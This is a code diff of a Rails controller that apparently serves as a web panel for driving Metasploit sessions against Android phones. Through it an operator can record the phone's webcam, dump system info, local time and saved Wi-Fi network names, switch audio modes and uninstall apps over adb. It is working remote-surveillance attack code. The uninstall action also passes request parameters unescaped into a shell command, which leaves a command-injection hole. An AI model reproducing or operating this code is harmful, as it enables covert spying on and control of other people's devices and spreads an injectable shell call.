@@ -3,44 +3,35 @@ class SmartphonesController < InheritedResources::Base
   @@isWebcamRecordOn=false
 
   def dump_sysinfo
-    @@nrRunningProcesses+=1
     processCommand="sysinfo"
     commandOutput=start_msf_process(processCommand)
     respond_to do |format|
         format.js { render "dump_sysinfo", :locals => {:commandOutput => commandOutput}  }
       end
-    @@nrFinishedProcesses+=1
-    @@nrRunningProcesses-=1
   end
 
-
-
-
   def webcam_record
+    commandOutput=[]
     if !@@isWebcamRecordOn
         commandTimeout=params[:exec_timeout].to_i
+        camera=params[:back_camera] == "true" ? '1' : '2'
         currentTime = DateTime.now
         currentTimeFormat=currentTime.strftime("%Y%m%d%H%M%S")
         @fileNameJpeg= "webcam_record_" + currentTimeFormat + '.jpeg'
         @fileNameHtml= "webcam_record_" + currentTimeFormat + '.html'
-        #remove quality
-        processCommand="webcam_stream -v false -i 1 -s #{@fileNameJpeg} -t #{@fileNameHtml}"
+        processCommand="webcam_stream -v false -i #{camera} -s #{@fileNameJpeg} -t #{@fileNameHtml}"
         commandOutput=start_msf_process(processCommand)
-        puts commandOutput
-
         isOperationSuccessful=false
         1.upto(commandTimeout) do |n|
             if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
               isOperationSuccessful = true
               @@isWebcamRecordOn = true
-              sleep 5
               break
             else
                 puts "Waiting ..."
             end
             sleep 1
-          end
-
+        end
         commandOutput=["Operation Failed"] if not isOperationSuccessful
     else
         commandOutput.append('Control+Z')
@@ -57,9 +48,9 @@ end
 
 
 def set_audio_mode
-  processCommand="set_audio_mode -m 2"
+  processCommand="set_audio_mode -m #{@@soundMode}"
   commandOutput=start_msf_process(processCommand)
-
+  @@soundMode=@@soundMode == 2 ? 0 : 2
   respond_to do |format|
       format.js { render "set_audio_mode", :locals => {:commandOutput => commandOutput}  }
     end
@@ -71,10 +62,10 @@ end
 
 def dump_wifi_info
   if @@isAdbConnected
-      commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "dumpsys wifi | grep SSID: | grep -v rt="`
+      commandOutput=run_adb_command('shell "dumpsys wifi | grep SSID: | grep -v rt="')
   else
       start_msf_process("shell")
-      processCommand='shell "dumpsys wifi | grep SSID: | grep -v rt="'
+      processCommand='dumpsys wifi | grep SSID: | grep -v rt='
       commandOutput=start_msf_process(processCommand)
       detach_session
   end
@@ -88,15 +79,11 @@ end
 
 
 def dump_localtime
-  @@nrRunningProcesses+=1
   processCommand="localtime"
   commandOutput=start_msf_process(processCommand)
-  puts commandOutput
   respond_to do |format|
       format.js { render "dump_localtime", :locals => {:commandOutput => commandOutput}  }
     end
-  @@nrFinishedProcesses+=1
-  @@nrRunningProcesses-=1
 end
 
 
@@ -105,9 +92,9 @@ end
 
 def uninstall_app
   if @@isAdbConnected
-    commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 uninstall #{params[:app_name]}`
+    commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 uninstall #{params[:app]}`
   else
-    processCommand="app_uninstall #{params[:app_name]}"
+    processCommand="app_uninstall #{params[:app]}"
     commandOutput=start_msf_process(processCommand)
 end
 respond_to do |format|
